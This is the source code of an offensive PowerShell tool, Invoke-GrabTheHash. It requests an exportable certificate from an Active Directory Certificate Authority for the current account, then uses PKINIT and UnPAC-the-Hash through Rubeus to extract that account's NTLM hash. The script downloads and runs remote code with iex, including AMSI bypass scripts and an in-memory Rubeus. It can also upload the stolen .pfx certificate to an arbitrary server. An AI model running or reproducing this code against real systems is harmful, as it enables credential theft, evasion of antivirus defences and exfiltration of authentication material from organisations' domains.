<#
.SYNOPSIS
Invoke-GrabTheHash Author: Rob LP (@L3o4j)
https://github.com/Leo4j/Invoke-GrabTheHash

.DESCRIPTION
Requests a certificate from a Windows Certificate Authority (CA) for the User or Machine Account TGT held in your current session,
uses PKINIT to obtain a TGT for the same Account, then performs the UnPAC-the-Hash technique to extract the Account's NTLM hash.

.PARAMETER Domain
Specify the target domain

.PARAMETER CertTemplates
Enumerate for Certificate Templates

.PARAMETER TemplateName
Specify a Certificate Template to use

.PARAMETER CAName
Specify the Certificate Authority Name

.PARAMETER CN
Specify the Account Client Name

.PARAMETER PFX
Provide a previously obtained .pfx to get the account hash

.PARAMETER Upload
Upload .pfx file to a server

.PARAMETER Machine
Work with Machine Accounts TGTs and Certificates (needs to run in elevated context)

.PARAMETER Break
Stop before grabbing the Hash
#>

function Invoke-GrabTheHash
{

	[CmdletBinding()]
	Param(
		[Parameter(Mandatory=$False,ValueFromPipeline=$True,ValueFromPipelineByPropertyName=$True)]
		[string]$CN,
		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[String]$TemplateName,
		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[string]$CAName,
		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[string]$Domain,
		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[string]$PFX,
  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[string]$Upload,
		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[switch]$CertTemplates,
		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[switch]$Machine,
  		[Parameter(Mandatory=$False,ValueFromPipelineByPropertyName=$True)]
		[switch]$Break
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	
	Write-Host ""
	
	if($Machine){
		$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
		if($isAdmin){}
		else{
			Write-Host "[-] Not running on an elevated context. Working with Machine Certificates will fail." -ForegroundColor Yellow
			Write-Host ""
		}
	}

 	if($Domain){
		$currentDomain = $Domain
	}
	else{

		Write-Host "[-] Domain switch not provided. Enumerating the Domain Name..."
		Write-Host ""
 
		try{
			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
			$currentDomain = $currentDomain.Name
		}
		catch{$currentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}

		Write-Host "[+] Target Domain will be set to: $currentDomain"
		Write-Host ""
	}

 	if($CertTemplates){

		Write-Host "[+] Certificate Templates:"
		Write-Host ""

		try{

			$domainDistinguishedName = "DC=" + ($currentDomain -replace "\.", ",DC=")
			$ldapConnection = New-Object System.DirectoryServices.DirectoryEntry
			$ldapConnection.Path = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$domainDistinguishedName"
			$ldapConnection.AuthenticationType = "None"
			
			$searcher = New-Object System.DirectoryServices.DirectorySearcher
			$searcher.SearchRoot = $ldapConnection
			$searcher.Filter = "(objectClass=pKICertificateTemplate)"
			$searcher.SearchScope = "Subtree"
			
			$results = $searcher.FindAll()
			
			$AllTemplates = foreach ($result in $results) {
				$templateName = $result.Properties["name"][0]
				$templateName
			}

			$AllTemplates | Sort

   			Write-Host ""
			Write-Host "[+] Certificates that permit client authentication:"
			Write-Host ""
			
			$searcher.Filter = "(&(objectClass=pKICertificateTemplate)(pkiExtendedKeyUsage=1.3.6.1.5.5.7.3.2))"
			$searcher.SearchScope = "Subtree"

			$results = $searcher.FindAll()

			$ClientAuthTemplates = foreach ($result in $results) {
				if($result.Properties["pkiextendedkeyusage"] -contains "1.3.6.1.5.5.7.3.2") {
					$templateName = $result.Properties["name"][0]
					$templateName
				}
			}

			$ClientAuthTemplates | Sort
			
			# Dispose resources
			$results.Dispose()
			$searcher.Dispose()
			$ldapConnection.Dispose()
		}

		catch{
			$AllTemplates = certutil -template
			$AllTemplates -split "`n" | Where-Object { $_ -match 'TemplatePropCommonName' } | ForEach-Object { $_.Replace('TemplatePropCommonName = ', '').Trim() } | Sort
		}

		Write-Host ""

		break
	}

 	if($PFX){
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
		
		$RubOutput = Invoke-Rubeus asktgt /user:$CN /certificate:$PFX /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
		
		if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
			$ntlmValue = $Matches[1]
			Write-Host "$CN NTLM hash: $ntlmValue"
			Write-Host ""
		}

		break
	}
	
	if(!$CAName){
		$CertutilDump = certutil
		$CertutilDump = ($CertutilDump | Out-String) -split "`n"
		$CertutilDump = $CertutilDump.Trim()
		$CertutilDump = $CertutilDump | Where-Object { $_ -ne "" }
		$caNames = $CertutilDump | Where-Object { $_ -match "Config:\s*(.*)" } | ForEach-Object { $matches[1] }
	}
	
	if(!$CN){
		$KlistDump = klist
		$clientLine = $KlistDump | Where-Object { $_ -like "*Client:*" }
		$clientName = (($clientLine[0] -split 'Client: ')[1] -split ' @')[0].Trim()
		$CN = $clientName
	}
	
	if($Machine){
		if($TemplateName){}
		else{$TemplateName = "Machine"}
	}
	
	else{$TemplateName = "User"}
	
	function Remove-ReqTempfiles()
	{
		param(
			[String[]]$tempfiles
		)
		
		if($Machine){$certstore = new-object system.security.cryptography.x509certificates.x509Store('REQUEST', 'LocalMachine')}
		else{$certstore = new-object system.security.cryptography.x509certificates.x509Store('REQUEST', 'CurrentUser')}
		
		$certstore.Open('ReadWrite')
		foreach($certreq in $($certstore.Certificates))
		{
			if($certreq.Subject -eq "CN=$CN")
			{
				$certstore.Remove($certreq)
			}
		}
		$certstore.close()
		
		foreach($file in $tempfiles){remove-item ".\$file" -ErrorAction silentlycontinue}
	}

	Write-Host "[+] Requesting certificate with subject $CN"
 	Write-Host ""
	
	if($Machine){
	$file = @"
[NewRequest]
Subject = "CN=$CN,c=$Country, s=$State, l=$City, o=$Organisation, ou=$Department"
MachineKeySet = TRUE
KeyLength = 2048
KeySpec=1
Exportable = TRUE
RequestType = PKCS10
[RequestAttributes]
CertificateTemplate = "$TemplateName"
"@
}
	
	else{
	$file = @"
[NewRequest]
Subject = "CN=$CN"
KeyLength = 2048
KeySpec=1
Exportable = TRUE
RequestType = PKCS10
[RequestAttributes]
CertificateTemplate = "$TemplateName"
"@
}

	Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
	Set-Content .\certreq.inf $file
	Get-Content .\certreq.inf | Write-Verbose

	Invoke-Expression -Command "certreq -new -q certreq.inf certreq.req" >$null 2>&1
	if(!($LastExitCode -eq 0))
	{
		Write-Host "[-] Certificate request failed"
		Write-Host ""
		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
		break
	}

	if($CAName){	
		Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
	}
	else{
		$success = $false
		foreach($CAName in $caNames){
			try{
				Invoke-Expression -Command "certreq -submit -q -config `"$CAName`" certreq.req $CN.cer" >$null 2>&1
				if($LASTEXITCODE -eq 0) {
					$success = $true
					break
				}
			}
			catch{continue}
		}
		
		if(-not $success){
			Invoke-Expression -Command "certreq -submit certreq.req $CN.cer" >$null 2>&1
		}
	}
	
	if(!($LastExitCode -eq 0))
	{
		Write-Host "[-] Certificate request failed"
		Write-Host ""
		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
		break
	}

	Invoke-Expression -Command "certreq -accept -q $CN.cer" >$null 2>&1

	if(!($LastExitCode -eq 0))
	{
		Write-Host "[-] Certificate request failed"
		Write-Host ""
		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
		break
	}

	if(($LastExitCode -eq 0) -and ($? -eq $true))
	{}
	
	else
	{
		Write-Host "[-] Certificate request failed"
		Write-Host ""
		Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"
		break
	}
	
	if($Machine){$cert = Get-Childitem "cert:\LocalMachine\My" | where-object {$_.Thumbprint -eq (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2((Get-Item "$CN.cer").FullName,"")).Thumbprint}}
	else{$cert = Get-Childitem "cert:\CurrentUser\My" | where-object {$_.Thumbprint -eq (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2((Get-Item "$CN.cer").FullName,"")).Thumbprint}}

	$certbytes = $cert.export([System.Security.Cryptography.X509Certificates.X509ContentType]::pfx)

	$certbytes | Set-Content -Encoding Byte -Path "$CN.pfx" -ea Stop
	Write-Host "[+] Certificate successfully exported to $CN.pfx"
	Write-Host ""
	
	if($Machine){$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'LocalMachine')}
	else{$certstore = new-object system.security.cryptography.x509certificates.x509Store('My', 'CurrentUser')}
	$certstore.Open('ReadWrite')
	$certstore.Remove($cert)
	$certstore.close()
	
	Remove-ReqTempfiles -tempfiles "certreq.inf","certreq.req","$CN.cer","$CN.rsp"

 	if($Upload){
		Write-Host "[+] Uploading $CN.pfx to $Upload"
		Write-Host ""
		$file = "$pwd\$CN.pfx";
		$httpuri = "$Upload";
		$webclient = New-Object System.Net.WebClient;
		$uri = New-Object System.Uri($httpuri);
		$webclient.UploadFile($uri, $file) | Out-Null
	}
	
	if($Break){
		Write-Host "[-] Stopping here, before grabbing the Hash"
		Write-Host ""
		break
	}
		
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1') > $null
	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Rubeus.ps1')
	
	$RubOutput = Invoke-Rubeus asktgt /user:$CN /certificate:$pwd\$CN.pfx /nowrap /getcredentials /enctype:aes256 /domain:$currentDomain
	
	if ($RubOutput -match "NTLM\s+:\s+([A-Fa-f0-9]{32})") {
		$ntlmValue = $Matches[1]
		Write-Host "[+] $CN NTLM hash: $ntlmValue"
		Write-Host ""
	}
}
